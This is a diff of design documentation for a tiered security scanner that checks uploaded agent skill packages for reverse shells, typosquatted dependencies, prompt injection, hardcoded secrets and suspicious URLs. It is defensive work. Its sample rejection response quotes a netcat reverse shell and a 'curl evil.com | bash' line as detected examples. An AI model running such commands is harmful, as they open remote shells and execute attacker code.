@@ -41,18 +41,19 @@ type Scanner interface {
                │  - Dependency blocklist   │
                └─────────┬────────┬────────┘
                          │        │
-                    no flags   flags or dep files present
+                    BLOCK found   no BLOCK
                          │        │
                     ┌────▼────┐   │
-                    │ ACCEPT  │   │
+                    │ REJECT  │   │
                     └─────────┘   │
-                         ┌────────▼────────────┐
-                         │  TIER 2: Deep Scan  │  < 500ms
-                         │  - Typosquat check  │
-                         │  - Prompt injection │
-                         │  - Homoglyph detect │
-                         │  - Install hooks    │
-                         └────────┬───────┬────┘
+                         ┌────────▼──────────────┐
+                         │  TIER 2: Deep Scan    │  < 500ms (always runs)
+                         │  - Typosquat check    │
+                         │  - Prompt injection   │
+                         │  - Security analysis  │
+                         │  - Hardcoded secrets  │
+                         │  - Suspicious URLs    │
+                         └────────┬───────┬──────┘
                                   │       │
                              resolved   unresolved flags
                                   │       │
@@ -71,29 +72,32 @@ type Scanner interface {
                                      └─────────┘
 ```
 
-**Short-circuit optimization:** ~95% of uploads contain no suspicious patterns and are accepted at Tier 1 without ever reaching Tier 2 or 3. Tier 2 runs only when Tier 1 produces FLAG findings or when dependency manifests (`requirements.txt`, `package.json`, `pyproject.toml`) are present. Tier 3 runs only when Tier 2 leaves unresolved FLAG findings and LLM analysis is enabled.
+**Tier 2 always runs** — security analysis (hardcoded secrets, suspicious URLs, credential exposure, system modification) applies to all uploads regardless of Tier 1 findings. Dependency and prompt checks run when relevant files are present. Tier 3 runs only when Tier 2 leaves unresolved FLAG findings and LLM analysis is enabled.
 
 ## File Structure
 
 ```
 internal/scanner/
-├── scanner.go               # Pipeline struct, Scan() method, tier orchestration
-├── result.go                # Finding, ScanResult, Severity types
+├── scanner.go               # Pipeline struct, Scan(), hot-reload, tier orchestration
+├── result.go                # Finding, ScanResult, Severity types, scan summaries
 ├── errors.go                # ErrBlocked, ErrScanFailed sentinel errors
 ├── metrics.go               # Atomic scan counters (pass/block/fail, per-tier, per-category)
 ├── zipcheck.go              # CheckZIPSafety — zip bomb protection
+├── lineutil.go              # Line number extraction, snippet helpers
+├── default_patterns.yaml    # Default pattern definitions (embedded via go:embed)
+├── pattern_loader.go        # YAML pattern loader, merger, OSSF feed importer, ParsePatternData
+├── pattern_loader_test.go   # Pattern loader tests (10 cases)
 ├── stage_patterns.go        # Tier 1: static regex patterns + dep blocklist
 ├── corpus.go                # ~200 popular PyPI/npm package names for typosquat detection
 ├── stage_deps.go            # Tier 2: typosquatting, homoglyphs, install hooks
 ├── stage_deps_test.go       # Tier 2 deps tests (12 cases)
 ├── stage_prompt.go          # Tier 2: prompt injection, delimiter injection, invisible Unicode
 ├── stage_prompt_test.go     # Tier 2 prompt tests (17 cases)
-├── stage_external.go        # Tier 2: pluggable external scanner interface + stage wrapper
-├── clamav.go                # ClamAV clamd client (native INSTREAM protocol)
-├── yara.go                  # YARA scanner (shells out to yara binary)
-├── stage_external_test.go   # External scanner tests (ClamAV, YARA, metrics — 20 cases)
+├── stage_security.go        # Tier 2: secrets, URLs, credentials, system modification
+├── stage_security_test.go   # Tier 2 security tests (40+ cases)
 ├── stage_llm.go             # Tier 3: LLM deep analysis via Claude API
 ├── stage_llm_test.go        # Tier 3 LLM tests (13 cases, mock HTTP server)
+├── stage_external_test.go   # Metrics tests (3 cases)
 └── scanner_test.go          # Integration tests + ZIP safety tests
 ```
 
@@ -103,16 +107,37 @@ Every scan observation is a `Finding`:
 
 ```go
 type Finding struct {
-    Stage       string   // "static_patterns", "dependencies", "prompt_injection", "llm_analysis"
+    Stage       string   // "static_patterns", "dependencies", "prompt_injection", "security_analysis", "llm_analysis"
     Severity    Severity // "BLOCK" or "FLAG"
-    Category    string   // e.g. "reverse_shell", "typosquat_package", "llm_threat"
+    Category    string   // e.g. "reverse_shell", "typosquat_package", "hardcoded_secret"
     FilePath    string   // relative path within the ZIP
     Description string   // human-readable explanation
+    Line        int      // line number in the file (0 if unavailable)
+    MatchText   string   // snippet of the matched text
+    Remediation string   // guidance for the skill author to fix the issue
+    IssueCode   string   // stable issue code (e.g. "E004", "W008")
 }
 ```
 
 - **BLOCK** — immediate rejection. The skill is never stored.
 - **FLAG** — suspicious but possibly legitimate. Escalated to a deeper tier for contextual judgment.
+
+### Scan Summary
+
+Each `ScanResult` includes a human-readable `Summary` generated by `GenerateSummary()`. It lists all findings grouped by severity with file paths, line numbers, and remediation guidance. Skill authors see this in the rejection response to understand exactly what to fix.
+
+### Issue Codes
+
+| Code | Severity | Category |
+|------|----------|----------|
+| E004 | BLOCK | Prompt injection |
+| E005 | BLOCK/FLAG | Suspicious URLs |
+| E006 | BLOCK | Malicious code patterns |
+| W007 | FLAG | Credential exposure risk |
+| W008 | BLOCK | Hardcoded secrets |
+| W009 | FLAG | Financial execution |
+| W012 | BLOCK/FLAG | Runtime external dependencies |
+| W013 | BLOCK/FLAG | System/service modification |
 
 ## Tier 1: Quick Scan (`stage_patterns.go`)
 
@@ -143,9 +168,11 @@ Runs compiled regexes against every text file in the ZIP. Scans all file extensi
 
 ### Dependency Blocklist
 
-The `blocklistPackages` map in `stage_patterns.go` contains ~40 known-malicious package names from Python (OSSF advisories) and Node.js (npm advisories). Checked by exact match in `requirements.txt` and `package.json`.
+The `blocklist_packages` list in `default_patterns.yaml` contains ~40 known-malicious package names from Python (OSSF advisories) and Node.js (npm advisories). Checked by exact match in `requirements.txt` and `package.json`. Can be extended via custom patterns, the OSSF feed, or the runtime patterns API.
 
 ## Tier 2: Deep Scan
+
+Tier 2 **always runs** for all uploads. It includes four stages:
 
 ### Dependency Analysis (`stage_deps.go`)
 
@@ -195,6 +222,19 @@ All text content is NFC-normalized (via `golang.org/x/text/unicode/norm`) before
 - Bidirectional text controls (LTR/RTL marks, embeddings, overrides, isolates)
 - Private use area characters
 - Tag characters (U+E0000-U+E007F)
+
+### Security Analysis (`stage_security.go`)
+
+Six check categories for detecting security-sensitive patterns:
+
+| Check | Issue Code | Severity | Patterns |
+|-------|-----------|----------|----------|
+| Hardcoded secrets | W008 | BLOCK | AWS keys (`AKIA...`), GitHub tokens (`ghp_`, `gho_`), Slack tokens, Stripe keys, OpenAI/Anthropic keys, private keys (`BEGIN.*PRIVATE KEY`), database URLs with credentials, generic `api_key = "..."` |
+| Suspicious URLs | E005 | BLOCK/FLAG | Executable downloads (`.exe`, `.sh`, `.ps1`), URL shorteners (bit.ly, tinyurl), paste/temp hosting (pastebin, transfer.sh), raw GitHub content, IP-based URLs |
+| Credential exposure | W007 | FLAG | Skills instructing agents to output/send API keys or secrets (SKILL.md only) |
+| Financial execution | W009 | FLAG | Stripe charges, PayPal transactions, crypto transfers, trading operations (SKILL.md only) |
+| Runtime dependencies | W012 | BLOCK/FLAG | Runtime instruction fetching, auto-update mechanisms, dynamic code loading from URLs |
+| System modification | W013 | BLOCK/FLAG | `sudo`, `systemctl`, `launchctl`, `chmod +s`, `chown root`, `iptables`, Windows registry |
 
 ## Tier 3: LLM Deep Analysis (`stage_llm.go`)
 
@@ -271,27 +311,136 @@ Runs **before** the scanner pipeline. Checks:
 | Entry count | 500 files | Prevents file descriptor exhaustion |
 | Compression ratio | 100:1 per file | Detects zip bomb quines |
 | Nested archives | Rejected | `.zip`, `.tar`, `.gz`, `.7z`, etc. inside ZIP |
+| Path traversal | Rejected | Entries containing `..` |
+| Symlinks | Rejected | Symlink entries in the ZIP |
 
 ## Configuration
 
 All config is via environment variables, following 12-factor methodology.
 
-| Variable | Type | Default | Phase | Description |
-|----------|------|---------|-------|-------------|
-| `SKILLBOX_SCANNER_ENABLED` | bool | `true` | 1 | Enable/disable the entire scanner |
-| `SKILLBOX_SCANNER_TIMEOUT` | duration | `30s` | 1 | Total scan timeout (all tiers) |
-| `SKILLBOX_SCANNER_LLM_ENABLED` | bool | `false` | 3 | Enable LLM deep analysis (Tier 3) |
-| `SKILLBOX_SCANNER_LLM_API_KEY` | string | — | 3 | Anthropic API key (required if LLM enabled) |
-| `SKILLBOX_SCANNER_LLM_MODEL` | string | `claude-haiku-4-5-20251001` | 3 | Claude model for analysis |
-| `SKILLBOX_SCANNER_LLM_TIMEOUT` | duration | `10s` | 3 | Per-LLM-call timeout |
-| `SKILLBOX_SCANNER_LLM_MAX_CONCURRENT` | int | `5` | 3 | Max concurrent LLM API calls |
-| `SKILLBOX_SCANNER_EXTERNAL_TYPE` | string | `none` | 4 | External scanner: `none`, `clamav`, `yara` |
-| `SKILLBOX_SCANNER_CLAMAV_ADDRESS` | string | `tcp://127.0.0.1:3310` | 4 | ClamAV clamd address (TCP or Unix socket) |
-| `SKILLBOX_SCANNER_YARA_RULES_DIR` | string | — | 4 | Directory containing `.yar`/`.yara` rule files |
+| Variable | Type | Default | Description |
+|----------|------|---------|-------------|
+| `SKILLBOX_SCANNER_ENABLED` | bool | `true` | Enable/disable the entire scanner |
+| `SKILLBOX_SCANNER_TIMEOUT` | duration | `30s` | Total scan timeout (all tiers) |
+| `SKILLBOX_SCANNER_PATTERNS_FILE` | string | — | Path to custom patterns YAML loaded at startup |
+| `SKILLBOX_SCANNER_OSSF_FEED_DIR` | string | — | Path to directory of OSV JSON files from OSSF malicious packages feed |
+| `SKILLBOX_SCANNER_LLM_ENABLED` | bool | `false` | Enable LLM deep analysis (Tier 3) |
+| `SKILLBOX_SCANNER_LLM_API_KEY` | string | — | Anthropic API key (required if LLM enabled) |
+| `SKILLBOX_SCANNER_LLM_MODEL` | string | `claude-haiku-4-5-20251001` | Claude model for analysis |
+| `SKILLBOX_SCANNER_LLM_TIMEOUT` | duration | `10s` | Per-LLM-call timeout |
+| `SKILLBOX_SCANNER_LLM_MAX_CONCURRENT` | int | `5` | Max concurrent LLM API calls |
 
 **Startup validation:**
 - `SKILLBOX_SCANNER_ENABLED=false` emits `slog.Warn` at startup
 - `SKILLBOX_SCANNER_LLM_ENABLED=true` without `SKILLBOX_SCANNER_LLM_API_KEY` fails startup
+
+## Custom Patterns
+
+All scanner patterns (regex rules, malicious package blocklist, popular package corpus) are defined in `default_patterns.yaml` and embedded in the binary via `//go:embed`. The scanner works out of the box with zero configuration.
+
+### Pattern File Format
+
+Pattern files use YAML (or JSON) with the following schema:
+
+```yaml
+version: 1
+
+block_patterns:
+  - regex: '\bmy-custom-evil-pattern\b'
+    category: custom_block
+    description: "Custom block pattern for internal use"
+
+flag_patterns:
+  - regex: '\bsuspicious-api-call\b'
+    category: custom_flag
+    description: "Flag for review"
+
+common_block_patterns: []
+common_flag_patterns: []
+
+blocklist_packages:
+  - my-known-bad-package
+
+popular_packages:
+  - my-internal-library
+```
+
+### Static Configuration (Startup)
+
+Create a YAML file following the schema above and set:
+
+```bash
+SKILLBOX_SCANNER_PATTERNS_FILE=/path/to/custom-patterns.yaml
+```
+
+Custom patterns are **merged on top** of defaults — they add rules, never remove built-in protection. You only need to include the sections you want to extend (empty sections can be omitted).
+
+### Runtime Pattern Management (API)
+
+Custom patterns can be managed at runtime via the admin API without restarting the server:
+
+**Get current custom patterns:**
+```
+GET /v1/admin/scanner/patterns
+```
+
+Returns the currently active custom pattern overlay. If no custom patterns are loaded, returns an empty `PatternFile` with `version: 1`.
+
+**Upload/replace custom patterns:**
+```
+PUT /v1/admin/scanner/patterns
+Content-Type: application/yaml
+```
+
+```yaml
+version: 1
+block_patterns:
+  - regex: 'my-dangerous-pattern'
+    category: custom_threat
+    description: "Custom threat pattern"
+blocklist_packages:
+  - evil-package
+```
+
+Response:
+```json
+{
+  "status": "loaded",
+  "block_patterns": 1,
+  "flag_patterns": 0,
+  "blocklist_packages": 1,
+  "popular_packages": 0
+}
+```
+
+**Clear custom patterns (revert to defaults):**
+```
+PUT /v1/admin/scanner/patterns
+```
+Send an empty body or `{"version": 1}` to clear all custom patterns.
+
+**How hot-reload works:**
+- The pipeline holds a `sync.RWMutex` — scans in progress complete uninterrupted while pattern reload acquires the write lock.
+- Custom patterns are merged on top of embedded defaults (same merge logic as startup).
+- The OSSF feed is also re-read on each reload if configured.
+- Invalid patterns (bad regex, wrong version) are rejected with HTTP 400 — the pipeline is never left in a broken state.
+- Both YAML and JSON formats are accepted (YAML is a superset of JSON).
+
+### OSSF Malicious Packages Feed
+
+The [OSSF malicious-packages repository](https://github.com/ossf/malicious-packages) maintains 15,000+ reports of malicious packages in OSV JSON format across npm, PyPI, and other ecosystems.
+
+To use it:
+
+```bash
+# Clone the feed
+git clone https://github.com/ossf/malicious-packages.git /opt/ossf-feed
+
+# Point the scanner at the OSV directory
+SKILLBOX_SCANNER_OSSF_FEED_DIR=/opt/ossf-feed/osv/malicious
+```
+
+The loader walks the directory recursively, reads each `.json` file, extracts package names from the `affected[].package.name` field, and adds them to the blocklist. Malformed files are skipped with a warning.
 
 ## HTTP Response on Rejection
 
@@ -303,50 +452,13 @@ When a skill is blocked, the upload handler returns HTTP 422 with a structured b
   "message": "upload rejected by security scan",
   "details": {
     "scan_id": "a1b2c3d4-...",
-    "categories": ["reverse_shell", "piped_execution"]
+    "categories": ["reverse_shell", "piped_execution"],
+    "summary": "BLOCKED: 2 issues found\n\n[BLOCK] [E006] reverse_shell in exploit.sh:1\n  Matched: nc -e /bin/sh 10.0.0.1 4444\n  Fix: Remove reverse shell commands...\n\n[BLOCK] [E006] piped_execution in install.sh:3\n  Matched: curl https://evil.com/script.sh | bash\n  Fix: Avoid piping downloaded content directly to shell interpreters..."
   }
 }
 ```
 
 Infrastructure failures (scanner unavailable) return HTTP 500.
-
-## Pluggable External Scanners
-
-External scanners (ClamAV, YARA) run in Tier 2 alongside dependency and prompt analysis. When unconfigured (`SKILLBOX_SCANNER_EXTERNAL_TYPE=none`, the default), the external stage is not added to the pipeline — zero overhead via nil check, not a no-op struct.
-
-### ClamAV (`clamav.go`)
-
-Native implementation of the ClamAV `clamd` INSTREAM protocol — no external Go dependency needed.
-
-**Protocol:** Connect via TCP or Unix socket → send `zINSTREAM\0` → send data in 64KB chunks (4-byte big-endian length + data) → send 4 zero bytes → read verdict.
-
-**Responses:**
-- `stream: OK` — clean file
-- `stream: <virus> FOUND` — malware detected → BLOCK
-- `stream: <msg> ERROR` — scan error → fail closed
-
-**Address formats:**
-- `tcp://127.0.0.1:3310` — TCP connection
-- `unix:/run/clamav/clamd.ctl` — Unix socket
-
-### YARA (`yara.go`)
-
-Shells out to the system `yara` binary — no CGO, no Go YARA bindings needed.
-
-Loads all `.yar`/`.yara` files from the configured rules directory at startup. For each file in the ZIP, writes to a temp file and runs `yara --no-warnings <rule> <file>`. Any match → BLOCK.
-
-**Startup validation:**
-- Rules directory must exist and contain at least one `.yar`/`.yara` file
-- `yara` binary must be in `$PATH`
-
-### ExternalScanner Interface
-
-```go
-type ExternalScanner interface {
-    ScanFile(ctx context.Context, filePath string, data []byte) ([]Finding, error)
-    Name() string
-}
-```
 
 ## Dry-Run Validation Endpoint
 
@@ -355,15 +467,20 @@ type ExternalScanner interface {
 - **200 OK** — scan passed, returns `{ "valid": true, "skill_name": "...", "scan_tier": 2, "duration_ms": 45 }`
 - **422 Unprocessable Entity** — scan failed, same body as upload rejection
 
-## Scanner Metrics
+## Scanner Admin Endpoints
 
-The pipeline tracks atomic counters for monitoring:
+| Method | Path | Description |
+|--------|------|-------------|
+| `GET` | `/v1/admin/scanner/stats` | Scanner metrics (pass/block/fail counts, timing, categories) |
+| `GET` | `/v1/admin/scanner/patterns` | Get current custom pattern overlay |
+| `PUT` | `/v1/admin/scanner/patterns` | Upload/replace custom patterns (hot-reload) |
+
+### Metrics Response
 
 ```
 GET /v1/admin/scanner/stats
 ```
 
-Response:
 ```json
 {
   "total_scans": 1542,
@@ -379,7 +496,6 @@ Response:
     "reverse_shell": 12,
     "typosquat_package": 8,
     "piped_execution": 6,
-    "malware_detected": 3,
     "prompt_injection": 19
   }
 }
@@ -393,6 +509,7 @@ In `cmd/skillbox-server/main.go`:
 
 ```go
 var sc scanner.Scanner
+var pipeline *scanner.Pipeline
 if cfg.ScannerEnabled {
     var llmCfg *scanner.LLMConfig
     if cfg.ScannerLLMEnabled {
@@ -403,16 +520,7 @@ if cfg.ScannerEnabled {
             MaxConcurrent: cfg.ScannerLLMMaxConcurrent,
         }
     }
-    // Configure external scanner (ClamAV/YARA).
-    var ext scanner.ExternalScanner
-    switch cfg.ScannerExternalType {
-    case "clamav":
-        ext, _ = scanner.NewClamAVScanner(cfg.ScannerClamAVAddress)
-    case "yara":
-        ext, _ = scanner.NewYARAScanner(cfg.ScannerYARARulesDir)
-    }
-
-    pipeline = scanner.New(cfg.ScannerTimeout, slog.Default(), llmCfg, ext)
+    pipeline = scanner.New(cfg.ScannerTimeout, slog.Default(), llmCfg, cfg.ScannerPatternsFile, cfg.ScannerOSSFFeedDir)
     sc = pipeline
 } else {
     sc = &scanner.NoopScanner{}
@@ -420,7 +528,7 @@ if cfg.ScannerEnabled {
 ```
 
 The `NoopScanner` is used when scanning is disabled, for tests, and as a fallback.
-The `pipeline` variable (non-nil when scanner is enabled) is passed to the router for the metrics endpoint.
+The `pipeline` variable (non-nil when scanner is enabled) is passed to the router for admin endpoints (metrics, patterns).
 
 ## Testing
 
@@ -442,14 +550,6 @@ go run ./scripts/gen-test-skills
 # Defaults: http://localhost:8080, test-api-key
 ```
 
-Expected results:
-- 9 BLOCK patterns → 422
-- 4 FLAG patterns → 201 (flagged but pass)
-- 2 dependency deep scan → 422
-- 3 prompt injection → 422
-- 1 invisible unicode → 201 (flagged only)
-- 1 clean skill → 201
-
 ### Unit Tests
 
 ```bash
@@ -457,12 +557,14 @@ go test ./internal/scanner/ -v
 ```
 
 - **scanner_test.go**: 22 integration tests (clean skills, reverse shells, crypto miners, fork bombs, blocklisted packages, context cancellation, binary/large file skipping)
+- **pattern_loader_test.go**: 10 tests (embedded defaults, custom YAML merge, invalid YAML/regex, OSSF feed loading, malformed JSON, version validation)
 - **stage_deps_test.go**: 12 tests (typosquatting at various distances, homoglyphs, install hooks, pyproject.toml, clean deps)
 - **stage_prompt_test.go**: 17 tests (all injection categories, score halving, invisible Unicode)
+- **stage_security_test.go**: 40+ tests (hardcoded secrets, suspicious URLs, credential exposure, financial execution, runtime deps, system modification, scan summaries, line utilities)
 - **stage_llm_test.go**: 13 tests (benign/threat detection, canary validation, API errors, rate limiting, timeouts, semaphore, markdown-wrapped JSON)
-- **stage_external_test.go**: 20 tests (mock external scanner, ClamAV INSTREAM protocol with mock clamd server, EICAR detection, fail-closed, address parsing, YARA binary/dir validation, metrics tracking, pipeline integration)
+- **stage_external_test.go**: 3 tests (metrics tracking — record scan, record failure, timing)
 
-LLM tests use `httptest.Server` to mock the Anthropic Messages API. ClamAV tests use a mock TCP server that speaks the INSTREAM protocol. No real API calls or daemon connections are made.
+LLM tests use `httptest.Server` to mock the Anthropic Messages API. No real API calls or daemon connections are made.
 
 ## Rollback
 
@@ -470,10 +572,10 @@ Instant rollback with no migration:
 
 - **Disable all scanning:** `SKILLBOX_SCANNER_ENABLED=false` and restart
 - **Disable LLM only:** `SKILLBOX_SCANNER_LLM_ENABLED=false` and restart (Tier 1+2 continue running)
-- **Disable external scanner:** `SKILLBOX_SCANNER_EXTERNAL_TYPE=none` and restart (Tier 1+2 without ClamAV/YARA)
+- **Clear custom patterns:** `PUT /v1/admin/scanner/patterns` with empty body (no restart needed)
 
 ## Future Ideas
 
 - **Quarantine bucket:** Store rejected skills in a separate MinIO bucket for post-mortem analysis
-- **Phase 4:** Pluggable external scanners (ClamAV, YARA)
-- **`POST /v1/skills/validate`:** Dry-run endpoint that runs the scanner without storing the skill
+- **Pattern versioning:** Track history of custom pattern changes via the API
+- **Webhook notifications:** Alert on blocked uploads via configurable webhook endpoints
